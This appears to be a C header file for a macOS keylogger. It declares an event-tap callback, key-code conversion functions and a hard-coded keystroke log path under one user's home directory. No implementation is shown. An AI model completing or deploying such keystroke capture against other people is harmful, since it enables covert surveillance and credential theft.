#ifndef _KEYLOGGER_H
#define _KEYLOGGER_H

#include <stdio.h>
#include <time.h>
#include <CoreGraphics/CoreGraphics.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Carbon/Carbon.h> /* For TIS functions. */


FILE *logfile = NULL;
const char *logfileLocation = "/Users/Pat/Developer/C/Keylogger/keystroke.log";

CGEventRef keyPressed(CGEventTapProxy proxy, CGEventType eventType, CGEventRef event, void *userInfo);
const char *convertKeyCode(int keyCode);
CFStringRef createStringForKey(CGKeyCode keyCode, UInt32 shiftKey);
#endif
